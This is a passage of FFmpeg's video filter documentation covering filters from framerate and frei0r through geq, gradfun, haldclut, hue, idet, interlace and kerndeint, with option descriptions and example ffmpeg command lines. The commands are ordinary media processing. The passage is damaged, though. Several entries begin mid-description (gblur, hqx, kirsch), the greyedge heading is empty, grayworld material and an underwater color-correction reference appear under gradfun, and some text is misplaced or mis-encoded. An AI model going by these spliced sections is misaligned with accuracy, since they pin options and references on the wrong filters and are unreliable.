ffmpeg -i LEFT -i RIGHT -filter_complex [0:v]scale=w=iw/2[left],[1:v]scale=w=iw/2[right],[left][right]framepack=sbs OUTPUT

```

### [11.102 framerate](#toc-framerate)

Change the frame rate by interpolating new video output frames from the source
frames.

This filter is not designed to function correctly with interlaced media. If
you wish to change the frame rate of interlaced media then you are required
to deinterlace before this filter and re-interlace after this filter.

A description of the accepted options follows.

`fps`

Specify the output frames per second. This option can also be specified
as a value alone. The default is `50`.

`interp_start`

Specify the start of a range where the output frame will be created as a
linear interpolation of two frames. The range is [`0`-`255`],
the default is `15`.

`interp_end`

Specify the end of a range where the output frame will be created as a
linear interpolation of two frames. The range is [`0`-`255`],
the default is `240`.

`scene`

Specify the level at which a scene change is detected as a value between
0 and 100 to indicate a new scene; a low value reflects a low
probability for the current frame to introduce a new scene, while a higher
value means the current frame is more likely to be one.
The default is `8.2`.

`flags`

Specify flags influencing the filter process.

Available value for flags is:

`scene_change_detect, scd`

Enable scene change detection using the value of the option scene.
This flag is enabled by default.

### [11.103 framestep](#toc-framestep)

Select one frame every N-th frame.

This filter accepts the following option:

`step`

Select frame after every `step` frames.
Allowed values are positive integers higher than 0. Default value is `1`.

### [11.104 freezedetect](#toc-freezedetect)

Detect frozen video.

This filter logs a message and sets frame metadata when it detects that the
input video has no significant change in content during a specified duration.
Video freeze detection calculates the mean average absolute difference of all
the components of video frames and compares it to a noise floor.

The printed times and duration are expressed in seconds. The
`lavfi.freezedetect.freeze_start` metadata key is set on the first frame
whose timestamp equals or exceeds the detection duration and it contains the
timestamp of the first frame of the freeze. The
`lavfi.freezedetect.freeze_duration` and
`lavfi.freezedetect.freeze_end` metadata keys are set on the first frame
after the freeze.

The filter accepts the following options:

`noise, n`

Set noise tolerance. Can be specified in dB (in case "dB" is appended to the
specified value) or as a difference ratio between 0 and 1. Default is -60dB, or
0.001.

`duration, d`

Set freeze duration until notification (default is 2 seconds).

### [11.105 freezeframes](#toc-freezeframes)

Freeze video frames.

This filter freezes video frames using frame from 2nd input.

The filter accepts the following options:

`first`

Set number of first frame from which to start freeze.

`last`

Set number of last frame from which to end freeze.

`replace`

Set number of frame from 2nd input which will be used instead of replaced frames.

### [11.106 frei0r](#toc-frei0r-1)

Apply a frei0r effect to the input video.

To enable the compilation of this filter, you need to install the frei0r
header and configure FFmpeg with `--enable-frei0r`.

It accepts the following parameters:

`filter_name`

The name of the frei0r effect to load. If the environment variable
`FREI0R_PATH` is defined, the frei0r effect is searched for in each of the
directories specified by the colon-separated list in `FREI0R_PATH`.
Otherwise, the standard frei0r paths are searched, in this order:
`HOME/.frei0r-1/lib/`, `/usr/local/lib/frei0r-1/`,
`/usr/lib/frei0r-1/`.

`filter_params`

A ’|’-separated list of parameters to pass to the frei0r effect.

A frei0r effect parameter can be a boolean (its value is either
"y" or "n"), a double, a color (specified as
R/G/B, where R, G, and B are floating point
numbers between 0.0 and 1.0, inclusive) or a color description as specified in the
[(ffmpeg-utils)"Color" section in the ffmpeg-utils manual](ffmpeg-utils.html#color-syntax),
a position (specified as X/Y, where
X and Y are floating point numbers) and/or a string.

The number and types of parameters depend on the loaded effect. If an
effect parameter is not specified, the default value is set.

#### [11.106.1 Examples](#toc-Examples-81)

* Apply the distort0r effect, setting the first two double parameters:
  ```
  frei0r=filter_name=distort0r:filter_params=0.5|0.01

  ```
* Apply the colordistance effect, taking a color as the first parameter:
  ```
  frei0r=colordistance:0.2/0.3/0.4
  frei0r=colordistance:violet
  frei0r=colordistance:0x112233

  ```
* Apply the perspective effect, specifying the top left and top right image
  positions:
  ```
  frei0r=perspective:0.2/0.2|0.8/0.2

  ```

For more information, see
<http://frei0r.dyne.org>

#### [11.106.2 Commands](#toc-Commands-94)

This filter supports the `filter_params` option as [commands](#commands).

### [11.107 fspp](#toc-fspp)

Apply fast and simple postprocessing. It is a faster version of [spp](#spp).

It splits (I)DCT into horizontal/vertical passes. Unlike the simple post-
processing filter, one of them is performed once per block, not per pixel.
This allows for much higher speed.

The filter accepts the following options:

`quality`

Set quality. This option defines the number of levels for averaging. It accepts
an integer in the range 4-5. Default value is `4`.

`qp`

Force a constant quantization parameter. It accepts an integer in range 0-63.
If not set, the filter will use the QP from the video stream (if available).

`strength`

Set filter strength. It accepts an integer in range -15 to 32. Lower values mean
more details but also more artifacts, while higher values make the image smoother
but also blurrier. Default value is `0` â PSNR optimal.

`use_bframe_qp`

Enable the use of the QP from the B-Frames if set to `1`. Using this
option may cause flicker since the B-Frames have often larger QP. Default is
`0` (not enabled).

### [11.108 fsync](#toc-fsync-1)

Synchronize video frames with an external mapping from a file.

For each input PTS given in the map file it either drops or creates as many
frames as necessary to recreate the sequence of output frames given in the
map file.

This filter is useful to recreate the output frames of a framerate conversion
by the [fps](#fps) filter, recorded into a map file using the ffmpeg option
`-stats_mux_pre`, and do further processing to the corresponding frames
e.g. quality comparison.

Each line of the map file must contain three items per input frame, the input
PTS (decimal), the output PTS (decimal) and the
output TIMEBASE (decimal/decimal), seperated by a space.
This file format corresponds to the output
of `-stats_mux_pre_fmt="{ptsi} {pts} {tb}"`.

The filter assumes the map file is sorted by increasing input PTS.

The filter accepts the following options:

`file, f`

The filename of the map file to be used.

Example:

```
# Convert a video to 25 fps and record a MAP_FILE file with the default format of this filter
ffmpeg -i INPUT -vf fps=fps=25 -stats_mux_pre MAP_FILE -stats_mux_pre_fmt "{ptsi} {pts} {tb}" OUTPUT

# Sort MAP_FILE by increasing input PTS
sort -n MAP_FILE

# Use INPUT, OUTPUT and the MAP_FILE from above to compare the corresponding frames in INPUT and OUTPUT via SSIM
ffmpeg -i INPUT -i OUTPUT -filter_complex '[0:v]fsync=file=MAP_FILE[ref];[1:v][ref]ssim' -f null -

```

### [11.109 gblur](#toc-gblur)

Set number of steps for Gaussian approximation. Default is `1`.

`planes`

Set which planes to filter. By default all planes are filtered.

`sigmaV`

Set vertical sigma, if negative it will be same as `sigma`.
Default is `-1`.

#### [11.109.1 Commands](#toc-Commands-95)

This filter supports same commands as options.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

### [11.110 geq](#toc-geq)

Apply generic equation to each pixel.

The filter accepts the following options:

`lum_expr, lum`

Set the luma expression.

`cb_expr, cb`

Set the chrominance blue expression.

`cr_expr, cr`

Set the chrominance red expression.

`alpha_expr, a`

Set the alpha expression.

`red_expr, r`

Set the red expression.

`green_expr, g`

Set the green expression.

`blue_expr, b`

Set the blue expression.

The colorspace is selected according to the specified options. If one
of the `lum_expr`, `cb_expr`, or `cr_expr`
options is specified, the filter will automatically select a YCbCr
colorspace. If one of the `red_expr`, `green_expr`, or
`blue_expr` options is specified, it will select an RGB
colorspace.

If one of the chrominance expression is not defined, it falls back on the other
one. If no alpha expression is specified it will evaluate to opaque value.
If none of chrominance expressions are specified, they will evaluate
to the luma expression.

The expressions can use the following variables and functions:

`N`

The sequential number of the filtered frame, starting from `0`.

`X`
`Y`

The coordinates of the current sample.

`W`
`H`

The width and height of the image.

`SW`
`SH`

Width and height scale depending on the currently filtered plane. It is the
ratio between the corresponding luma plane number of pixels and the current
plane ones. E.g. for YUV4:2:0 the values are `1,1` for the luma plane, and
`0.5,0.5` for chroma planes.

`T`

Time of the current frame, expressed in seconds.

`p(x, y)`

Return the value of the pixel at location (x,y) of the current
plane.

`lum(x, y)`

Return the value of the pixel at location (x,y) of the luma
plane.

`cb(x, y)`

Return the value of the pixel at location (x,y) of the
blue-difference chroma plane. Return 0 if there is no such plane.

`cr(x, y)`

Return the value of the pixel at location (x,y) of the
red-difference chroma plane. Return 0 if there is no such plane.

`r(x, y)`
`g(x, y)`
`b(x, y)`

Return the value of the pixel at location (x,y) of the
red/green/blue component. Return 0 if there is no such component.

`alpha(x, y)`

Return the value of the pixel at location (x,y) of the alpha
plane. Return 0 if there is no such plane.

`psum(x,y), lumsum(x, y), cbsum(x,y), crsum(x,y), rsum(x,y), gsum(x,y), bsum(x,y), alphasum(x,y)`

Sum of sample values in the rectangle from (0,0) to (x,y), this allows obtaining
sums of samples within a rectangle. See the functions without the sum postfix.

`interpolation`

Set one of interpolation methods:

`nearest, n`
`bilinear, b`

Default is bilinear.

For functions, if x and y are outside the area, the value will be
automatically clipped to the closer edge.

Please note that this filter can use multiple threads in which case each slice
will have its own expression state. If you want to use only a single expression
state because your expressions depend on previous state then you should limit
the number of filter threads to 1.

#### [11.110.1 Examples](#toc-Examples-82)

* Flip the image horizontally:
  ```
  geq=p(W-X\,Y)

  ```
* Generate a bidimensional sine wave, with angle `PI/3` and a
  wavelength of 100 pixels:
  ```
  geq=128 + 100*sin(2*(PI/100)*(cos(PI/3)*(X-50*T) + sin(PI/3)*Y)):128:128

  ```
* Generate a fancy enigmatic moving light:
  ```
  nullsrc=s=256x256,geq=random(1)/hypot(X-cos(N*0.07)*W/2-W/2\,Y-sin(N*0.09)*H/2-H/2)^2*1000000*sin(N*0.02):128:128

  ```
* Generate a quick emboss effect:
  ```
  format=gray,geq=lum_expr='(p(X,Y)+(256-p(X-4,Y-4)))/2'

  ```
* Modify RGB components depending on pixel position:
  ```
  geq=r='X/W*r(X,Y)':g='(1-X/W)*g(X,Y)':b='(H-Y)/H*b(X,Y)'

  ```
* Create a radial gradient that is the same size as the input (also see
  the [vignette](#vignette) filter):
  ```
  geq=lum=255*gauss((X/W-0.5)*3)*gauss((Y/H-0.5)*3)/gauss(0)/gauss(0),format=gray

  ```

### [11.111 gradfun](#toc-gradfun)

Fix the banding artifacts that are sometimes introduced into nearly flat
regions by truncation to 8-bit color depth.
Interpolate the gradients that should go where the bands are, and
dither them.

It is designed for playback only. Do not use it prior to
lossy compression, because compression tends to lose the dither and
bring back the bands.

It accepts the following parameters:

`strength`

The maximum amount by which the filter will change any one pixel. This is also
the threshold for detecting nearly flat regions. Acceptable values range from
.51 to 64; the default value is 1.2. Out-of-range values will be clipped to the
valid range.

`radius`

The neighborhood to fit the gradient to. A larger radius makes for smoother
gradients, but also prevents the filter from modifying the pixels near detailed
regions. Acceptable values are 8-32; the default value is 16. Out-of-range
values will be clipped to the valid range.

Alternatively, the options can be specified as a flat string:
strength[:radius]

#### [11.111.1 Examples](#toc-Examples-83)

* Apply the filter with a `3.5` strength and radius of `8`:
  ```
  gradfun=3.5:8

  ```
* Specify radius, omitting the strength (which will fall-back to the default
  value):
  ```
  gradfun=radius=8

  ```

See: <https://www.researchgate.net/publication/275213614_A_New_Color_Correction_Method_for_Underwater_Imaging>

The algorithm uses linear light, so input
data should be linearized beforehand (and possibly correctly tagged).

```
ffmpeg -i INPUT -vf zscale=transfer=linear,grayworld,zscale=transfer=bt709,format=yuv420p OUTPUT

```

### [11.114 greyedge](#toc-greyedge)

### [11.116 haldclut](#toc-haldclut-1)

Apply a Hald CLUT to a video stream.

First input is the video stream to process, and second one is the Hald CLUT.
The Hald CLUT input can be a simple picture or a complete video stream.

The filter accepts the following options:

`clut`

Set which CLUT video frames will be processed from second input stream,
can be first or all. Default is all.

`shortest`

Force termination when the shortest input terminates. Default is `0`.

`repeatlast`

Continue applying the last CLUT after the end of the stream. A value of
`0` disable the filter after the last frame of the CLUT is reached.
Default is `1`.

`haldclut` also has the same interpolation options as [lut3d](#lut3d) (both
filters share the same internals).

This filter also supports the [framesync](#framesync) options.

More information about the Hald CLUT can be found on Eskil Steenberg’s website
(Hald CLUT author) at <http://www.quelsolaar.com/technology/clut.html>.

#### [11.116.1 Commands](#toc-Commands-97)

This filter supports the `interp` option as [commands](#commands).

#### [11.116.2 Workflow examples](#toc-Workflow-examples)

#### [11.116.2.1 Hald CLUT video stream](#toc-Hald-CLUT-video-stream)

Generate an identity Hald CLUT stream altered with various effects:

```
ffmpeg -f lavfi -i [haldclutsrc](#haldclutsrc)=8 -vf "hue=H=2*PI*t:s=sin(2*PI*t)+1, curves=cross_process" -t 10 -c:v ffv1 clut.nut

```

Note: make sure you use a lossless codec.

Then use it with `haldclut` to apply it on some random stream:

```
ffmpeg -f lavfi -i mandelbrot -i clut.nut -filter_complex '[0][1] haldclut' -t 20 mandelclut.mkv

```

The Hald CLUT will be applied to the 10 first seconds (duration of
`clut.nut`), then the latest picture of that CLUT stream will be applied
to the remaining frames of the `mandelbrot` stream.

#### [11.116.2.2 Hald CLUT with preview](#toc-Hald-CLUT-with-preview)

A Hald CLUT is supposed to be a squared image of `Level*Level*Level` by
`Level*Level*Level` pixels. For a given Hald CLUT, FFmpeg will select the
biggest possible square starting at the top left of the picture. The remaining
padding pixels (bottom or right) will be ignored. This area can be used to add
a preview of the Hald CLUT.

Typically, the following generated Hald CLUT will be supported by the
`haldclut` filter:

```
ffmpeg -f lavfi -i [haldclutsrc](#haldclutsrc)=8 -vf "
   pad=iw+320 [padded_clut];
   smptebars=s=320x256, split [a][b];
   [padded_clut][a] overlay=W-320:h, curves=color_negative [main];
   [main][b] overlay=W-320" -frames:v 1 clut.png

```

It contains the original and a preview of the effect of the CLUT: SMPTE color
bars are displayed on the right-top, and below the same color bars processed by
the color changes.

Then, the effect of this Hald CLUT can be visualized with:

```
ffplay input.mkv -vf "movie=clut.png, [in] haldclut"

```

### [11.117 hflip](#toc-hflip)

Flip the input video horizontally.

For example, to horizontally flip the input video with `ffmpeg`:

```
ffmpeg -i in.avi -vf "hflip" out.avi

```

### [11.118 histeq](#toc-histeq)

This filter applies a global color histogram equalization on a
per-frame basis.

It can be used to correct video that has a compressed range of pixel
intensities. The filter redistributes the pixel intensities to
equalize their distribution across the intensity range. It may be
viewed as an "automatically adjusting contrast filter". This filter is
useful only for correcting degraded or poorly captured source
video.

The filter accepts the following options:

`strength`

Determine the amount of equalization to be applied. As the strength
is reduced, the distribution of pixel intensities more-and-more
approaches that of the input frame. The value must be a float number
in the range [0,1] and defaults to 0.200.

`intensity`

Set the maximum intensity that can generated and scale the output
values appropriately. The strength should be set as desired and then
the intensity can be limited if needed to avoid washing-out. The value
must be a float number in the range [0,1] and defaults to 0.210.

`antibanding`

Set the antibanding level. If enabled the filter will randomly vary
the luminance of output pixels by a small amount to avoid banding of
the histogram. Possible values are `none`, `weak` or
`strong`. It defaults to `none`.

### [11.119 histogram](#toc-histogram-1)

Compute and draw a color distribution histogram for the input video.

The computed histogram is a representation of the color component
distribution in an image.

Standard histogram displays the color components distribution in an image.
Displays color graph for each color component. Shows distribution of
the Y, U, V, A or R, G, B components, depending on input format, in the
current frame. Below each graph a color component scale meter is shown.

The filter accepts the following options:

`level_height`

Set height of level. Default value is `200`.
Allowed range is [50, 2048].

`scale_height`

Set height of color scale. Default value is `12`.
Allowed range is [0, 40].

`display_mode`

Set display mode.
It accepts the following values:

‘`stack`’

Per color component graphs are placed below each other.

‘`parade`’

Per color component graphs are placed side by side.

‘`overlay`’

Presents information identical to that in the `parade`, except
that the graphs representing color components are superimposed directly
over one another.

Default is `stack`.

`levels_mode`

Set mode. Can be either `linear`, or `logarithmic`.
Default is `linear`.

`components`

Set what color components to display.
Default is `7`.

`fgopacity`

Set foreground opacity. Default is `0.7`.

`bgopacity`

It accepts the following values:

‘`whiteonblack`’
‘`blackonwhite`’
‘`whiteongray`’
‘`blackongray`’
‘`coloronblack`’
‘`coloronwhite`’
‘`colorongray`’
‘`blackoncolor`’
‘`whiteoncolor`’
‘`grayoncolor`’

Default is `whiteonblack`.

#### [11.119.1 Examples](#toc-Examples-86)

* Calculate and draw histogram:
  ```
  ffplay -i input -vf histogram

  ```

### [11.120 hqdn3d](#toc-hqdn3d-1)

This is a high precision/quality 3d denoise filter. It aims to reduce
image noise, producing smooth images and making still images really
still. It should enhance compressibility.

It accepts the following optional parameters:

`luma_spatial`

A non-negative floating point number which specifies spatial luma strength.
It defaults to 4.0.

`chroma_spatial`

A non-negative floating point number which specifies spatial chroma strength.
It defaults to 3.0\*luma\_spatial/4.0.

`luma_tmp`

A floating point number which specifies luma temporal strength. It defaults to
6.0\*luma\_spatial/4.0.

`chroma_tmp`

A floating point number which specifies chroma temporal strength. It defaults to
luma\_tmp\*chroma\_spatial/luma\_spatial.

#### [11.120.1 Commands](#toc-Commands-98)

This filter supports same [commands](#commands) as options.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

### [11.121 hwdownload](#toc-hwdownload-1)

Download hardware frames to system memory.

The input must be in hardware frames, and the output a non-hardware format.
Not all formats will be supported on the output - it may be necessary to insert
an additional `format` filter immediately following in the graph to get
the output in a supported format.

### [11.122 hwmap](#toc-hwmap)

Map hardware frames to system memory or to another device.

This filter has several different modes of operation; which one is used depends
on the input and output formats:

* Hardware frame input, normal frame output

  Map the input frames to system memory and pass them to the output. If the
  original hardware frame is later required (for example, after overlaying
  something else on part of it), the `hwmap` filter can be used again
  in the next mode to retrieve it.
* Normal frame input, hardware frame output

  If the input is actually a software-mapped hardware frame, then unmap it -
  that is, return the original hardware frame.

  Otherwise, a device must be provided. Create new hardware surfaces on that
  device for the output, then map them back to the software format at the input
  and give those frames to the preceding filter. This will then act like the
  `hwupload` filter, but may be able to avoid an additional copy when
  the input is already in a compatible format.
* Hardware frame input and output

  A device must be supplied for the output, either directly or with the
  `derive_device` option. The input and output devices must be of
  different types and compatible - the exact meaning of this is
  system-dependent, but typically it means that they must refer to the same
  underlying hardware context (for example, refer to the same graphics card).

  If the input frames were originally created on the output device, then unmap
  to retrieve the original frames.

  Otherwise, map the frames to the output device - create new hardware frames
  on the output corresponding to the frames on the input.

The following additional parameters are accepted:

`mode`

Set the frame mapping mode. Some combination of:

read

The mapped frame should be readable.

write

The mapped frame should be writeable.

overwrite

The mapping will always overwrite the entire frame.

This may improve performance in some cases, as the original contents of the
frame need not be loaded.

direct

The mapping must not involve any copying.

Indirect mappings to copies of frames are created in some cases where either
direct mapping is not possible or it would have unexpected properties.
Setting this flag ensures that the mapping is direct and will fail if that is
not possible.

Defaults to read+write if not specified.

`derive_device type`

Rather than using the device supplied at initialisation, instead derive a new
device of type type from the device the input frames exist on.

`reverse`

In a hardware to hardware mapping, map in reverse - create frames in the sink
and map them back to the source. This may be necessary in some cases where
a mapping in one direction is required but only the opposite direction is
supported by the devices being used.

This option is dangerous - it may break the preceding filter in undefined
ways if there are any additional constraints on that filter’s output.
Do not use it without fully understanding the implications of its use.

### [11.123 hwupload](#toc-hwupload-1)

Upload system memory frames to hardware surfaces.

The device to upload to must be supplied when the filter is initialised. If
using ffmpeg, select the appropriate device with the `-filter_hw_device`
option or with the `derive_device` option. The input and output devices
must be of different types and compatible - the exact meaning of this is
system-dependent, but typically it means that they must refer to the same
underlying hardware context (for example, refer to the same graphics card).

The following additional parameters are accepted:

`derive_device type`

Rather than using the device supplied at initialisation, instead derive a new
device of type type from the device the input frames exist on.

### [11.124 hwupload\_cuda](#toc-hwupload_005fcuda-1)

Upload system memory frames to a CUDA device.

It accepts the following optional parameters:

`device`

The number of the CUDA device to use

### [11.125 hqx](#toc-hqx)

`hq3x` and `4` for `hq4x`.
Default is `3`.

### [11.126 hstack](#toc-hstack-1)

Stack input videos horizontally.

All streams must be of same pixel format and of same height.

Note that this filter is faster than using [overlay](#overlay) and [pad](#pad) filter
to create same output.

The filter accepts the following option:

`inputs`

Set number of input streams. Default is 2.

`shortest`

If set to 1, force the output to terminate when the shortest input
terminates. Default value is 0.

### [11.127 hsvhold](#toc-hsvhold)

Turns a certain HSV range into gray values.

This filter measures color difference between set HSV color in options
and ones measured in video stream. Depending on options, output
colors can be changed to be gray or not.

The filter accepts the following options:

`hue`

Set the hue value which will be used in color difference calculation.
Allowed range is from -360 to 360. Default value is 0.

`sat`

Set the saturation value which will be used in color difference calculation.
Allowed range is from -1 to 1. Default value is 0.

`val`

Set the value which will be used in color difference calculation.
Allowed range is from -1 to 1. Default value is 0.

`similarity`

Set similarity percentage with the key color.
Allowed range is from 0 to 1. Default value is 0.01.

0.00001 matches only the exact key color, while 1.0 matches everything.

`blend`

Blend percentage.
Allowed range is from 0 to 1. Default value is 0.

0.0 makes pixels either fully gray, or not gray at all.

Higher values result in more gray pixels, with a higher gray pixel
the more similar the pixels color is to the key color.

### [11.128 hsvkey](#toc-hsvkey)

Turns a certain HSV range into transparency.

This filter measures color difference between set HSV color in options
and ones measured in video stream. Depending on options, output
colors can be changed to transparent by adding alpha channel.

The filter accepts the following options:

`hue`

Set the hue value which will be used in color difference calculation.
Allowed range is from -360 to 360. Default value is 0.

`sat`

Set the saturation value which will be used in color difference calculation.
Allowed range is from -1 to 1. Default value is 0.

`val`

Set the value which will be used in color difference calculation.
Allowed range is from -1 to 1. Default value is 0.

`similarity`

Set similarity percentage with the key color.
Allowed range is from 0 to 1. Default value is 0.01.

0.00001 matches only the exact key color, while 1.0 matches everything.

`blend`

Blend percentage.
Allowed range is from 0 to 1. Default value is 0.

0.0 makes pixels either fully transparent, or not transparent at all.

Higher values result in semi-transparent pixels, with a higher transparency
the more similar the pixels color is to the key color.

### [11.129 hue](#toc-hue)

Modify the hue and/or the saturation of the input.

It accepts the following parameters:

`h`

Specify the hue angle as a number of degrees. It accepts an expression,
and defaults to "0".

`s`

Specify the saturation in the [-10,10] range. It accepts an expression and
defaults to "1".

`H`

Specify the hue angle as a number of radians. It accepts an
expression, and defaults to "0".

`b`

Specify the brightness in the [-10,10] range. It accepts an expression and
defaults to "0".

`h` and `H` are mutually exclusive, and can’t be
specified at the same time.

The `b`, `h`, `H` and `s` option values are
expressions containing the following constants:

`n`

frame count of the input frame starting from 0

`pts`

presentation timestamp of the input frame expressed in time base units

`r`

frame rate of the input video, NAN if the input frame rate is unknown

`t`

`tb`

time base of the input video

#### [11.129.1 Examples](#toc-Examples-87)

* Set the hue to 90 degrees and the saturation to 1.0:
  ```
  hue=h=90:s=1

  ```
* Same command but expressing the hue in radians:
  ```
  hue=H=PI/2:s=1

  ```
* Rotate hue and make the saturation swing between 0
  and 2 over a period of 1 second:
  ```
  hue="H=2*PI*t: s=sin(2*PI*t)+1"

  ```
* Apply a 3 seconds saturation fade-in effect starting at 0:
  ```
  hue="s=min(t/3\,1)"

  ```

  The general fade-in expression can be written as:

  ```
  hue="s=min(0\, max((t-START)/DURATION\, 1))"

  ```
* Apply a 3 seconds saturation fade-out effect starting at 5 seconds:
  ```
  hue="s=max(0\, min(1\, (8-t)/3))"

  ```

  The general fade-out expression can be written as:

  ```
  hue="s=max(0\, min(1\, (START+DURATION-t)/DURATION))"

  ```

#### [11.129.2 Commands](#toc-Commands-99)

This filter supports the following commands:

`b`
`s`
`h`
`H`

Modify the hue and/or the saturation and/or brightness of the input video.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

Adjusting hues can change lightness from original RGB triplet,
with this option enabled lightness is kept at same value.

### [11.131 hysteresis](#toc-hysteresis)

Grow first stream into second stream by connecting components.
This makes it possible to build more robust edge masks.

This filter accepts the following options:

`planes`

Set which planes will be processed as bitmap, unprocessed planes will be
copied from first stream.
By default value 0xf, all planes will be processed.

`threshold`

Set threshold which is used in filtering. If pixel component value is higher than
this value filter algorithm for connecting components is activated.
By default value is 0.

The `hysteresis` filter also supports the [framesync](#framesync) options.

### [11.132 iccdetect](#toc-iccdetect)

Detect the colorspace from an embedded ICC profile (if present), and update
the frame’s tags accordingly.

This filter accepts the following options:

`force`

If true, the frame’s existing colorspace tags will always be overridden by
values detected from an ICC profile. Otherwise, they will only be assigned if
they contain `unknown`. Enabled by default.

### [11.133 iccgen](#toc-iccgen)

Generate ICC profiles and attach them to frames.

This filter accepts the following options:

`color_primaries`
`color_trc`

Configure the colorspace that the ICC profile will be generated for. The
default value of `auto` infers the value from the input frame’s metadata,
defaulting to BT.709/sRGB as appropriate.

See the [setparams](#setparams) filter for a list of possible values, but note that
`unknown` are not valid values for this filter.

`force`

If true, an ICC profile will be generated even if it would overwrite an
already existing ICC profile. Disabled by default.

### [11.134 identity](#toc-identity)

Obtain the identity score between two input videos.

This filter takes two input videos.

Both input videos must have the same resolution and pixel format for
this filter to work correctly. Also it assumes that both inputs
have the same number of frames, which are compared one by one.

The obtained per component, average, min and max identity score is printed through
the logging system.

The filter stores the calculated identity scores of each frame in frame metadata.

This filter also supports the [framesync](#framesync) options.

In the below example the input file `main.mpg` being processed is compared
with the reference file `ref.mpg`.

```
ffmpeg -i main.mpg -i ref.mpg -lavfi identity -f null -

```

### [11.135 idet](#toc-idet)

Detect video interlacing type.

This filter tries to detect if the input frames are interlaced, progressive,
top or bottom field first. It will also try to detect fields that are
repeated between adjacent frames (a sign of telecine).

Single frame detection considers only immediately adjacent frames when classifying each frame.
Multiple frame detection incorporates the classification history of previous frames.

The filter will log these metadata values:

`single.current_frame`

Detected type of current frame using single-frame detection. One of:
“tff” (top field first), “bff” (bottom field first),
“progressive”, or “undetermined”

`single.tff`

Cumulative number of frames detected as top field first using single-frame detection.

`multiple.tff`

Cumulative number of frames detected as top field first using multiple-frame detection.

`single.bff`

Cumulative number of frames detected as bottom field first using single-frame detection.

`multiple.current_frame`

Detected type of current frame using multiple-frame detection. One of:
“tff” (top field first), “bff” (bottom field first),
“progressive”, or “undetermined”

`multiple.bff`

Cumulative number of frames detected as bottom field first using multiple-frame detection.

`single.progressive`

Cumulative number of frames detected as progressive using single-frame detection.

`multiple.progressive`

Cumulative number of frames detected as progressive using multiple-frame detection.

`single.undetermined`

Cumulative number of frames that could not be classified using single-frame detection.

`multiple.undetermined`

Cumulative number of frames that could not be classified using multiple-frame detection.

`repeated.current_frame`

Which field in the current frame is repeated from the last. One of “neither”, “top”, or “bottom”.

`repeated.neither`

Cumulative number of frames with no repeated field.

`repeated.top`

Cumulative number of frames with the top field repeated from the previous frame’s top field.

`repeated.bottom`

Cumulative number of frames with the bottom field repeated from the previous frame’s bottom field.

The filter accepts the following options:

`intl_thres`

Set interlacing threshold.

`prog_thres`

Set progressive threshold.

`rep_thres`

Threshold for repeated field detection.

`half_life`

Number of frames after which a given frame’s contribution to the
statistics is halved (i.e., it contributes only 0.5 to its
classification). The default of 0 means that all frames seen are given
full weight of 1.0 forever.

`analyze_interlaced_flag`

When this is not 0 then idet will use the specified number of frames to determine
if the interlaced flag is accurate, it will not count undetermined frames.
If the flag is found to be accurate it will be used without any further
computations, if it is found to be inaccurate it will be cleared without any
further computations. This allows inserting the idet filter as a low computational
method to clean up the interlaced flag

#### [11.135.1 Examples](#toc-Examples-88)

Inspect the field order of the first 360 frames in a video, in verbose detail:

```
ffmpeg -i INPUT -filter:v idet,metadata=mode=print -frames:v 360 -an -f null -

```

The idet filter will add analysis metadata to each frame, which will then be
discarded. At the end, the filter will also print a final report with statistics.

### [11.136 il](#toc-il)

Deinterleave or interleave fields.

This filter allows one to process interlaced images fields without
deinterlacing them. Deinterleaving splits the input frame into 2
fields (so called half pictures). Odd lines are moved to the top
half of the output image, even lines to the bottom half.
You can process (filter) them independently and then re-interleave them.

The filter accepts the following options:

`luma_mode, l`
`chroma_mode, c`
`alpha_mode, a`

Available values for luma\_mode, chroma\_mode and
alpha\_mode are:

‘`none`’

Do nothing.

‘`deinterleave, d`’

Deinterleave fields, placing one above the other.

‘`interleave, i`’

Interleave fields. Reverse the effect of deinterleaving.

Default value is `none`.

`luma_swap, ls`
`chroma_swap, cs`
`alpha_swap, as`

Swap luma/chroma/alpha fields. Exchange even & odd lines. Default value is `0`.

#### [11.136.1 Commands](#toc-Commands-100)

This filter supports the all above options as [commands](#commands).

### [11.137 inflate](#toc-inflate)

Apply inflate effect to the video.

This filter replaces the pixel by the local(3x3) average by taking into account
only values higher than the pixel.

It accepts the following options:

`threshold0`
`threshold1`
`threshold2`
`threshold3`

Limit the maximum change for each plane, default is 65535.
If 0, plane will remain unchanged.

#### [11.137.1 Commands](#toc-Commands-101)

This filter supports the all above options as [commands](#commands).

### [11.138 interlace](#toc-interlace)

Simple interlacing filter from progressive contents. This interleaves upper (or
lower) lines from odd frames with lower (or upper) lines from even frames,
halving the frame rate and preserving image height.

```
   Original        Original             New Frame
   Frame 'j'      Frame 'j+1'             (tff)
  ==========      ===========       ==================
    Line 0  -------------------->    Frame 'j' Line 0
    Line 1          Line 1  ---->   Frame 'j+1' Line 1
    Line 2 --------------------->    Frame 'j' Line 2
    Line 3          Line 3  ---->   Frame 'j+1' Line 3
     ...             ...                   ...
New Frame + 1 will be generated by Frame 'j+2' and Frame 'j+3' and so on

```

It accepts the following optional parameters:

`scan`

This determines whether the interlaced frame is taken from the even
(tff - default) or odd (bff) lines of the progressive frame.

`lowpass`

Vertical lowpass filter to avoid twitter interlacing and
reduce moire patterns.

‘`0, off`’

Disable vertical lowpass filter

‘`1, linear`’

Enable linear filter (default)

‘`2, complex`’

Enable complex filter. This will slightly less reduce twitter and moire
but better retain detail and subjective sharpness impression.

### [11.139 kerndeint](#toc-kerndeint)

Deinterlace input video by applying Donald Graft’s adaptive kernel
deinterling. Work on interlaced parts of a video to produce
progressive frames.

The description of the accepted parameters follows.

`thresh`

Set the threshold which affects the filter’s tolerance when
determining if a pixel line must be processed. It must be an integer
in the range [0,255] and defaults to 10. A value of 0 will result in
applying the process on every pixels.

`map`

Paint pixels exceeding the threshold value to white if set to 1.
Default is 0.

`order`

Set the fields order. Swap fields if set to 1, leave fields alone if
0. Default is 0.

`sharp`

Enable additional sharpening if set to 1. Default is 0.

`twoway`

Enable twoway sharpening if set to 1. Default is 0.

#### [11.139.1 Examples](#toc-Examples-89)

* Apply default values:
  ```
  kerndeint=thresh=10:map=0:order=0:sharp=0:twoway=0

  ```
* Enable additional sharpening:
  ```
  kerndeint=sharp=1

  ```
* Paint processed pixels in white:
  ```
  kerndeint=map=1

  ```

### [11.140 kirsch](#toc-kirsch)

Set which planes to filter. Default is all. Allowed range is from 0 to 15.

#### [11.141.1 Commands](#toc-Commands-103)

This filter supports the all above options as [commands](#commands).

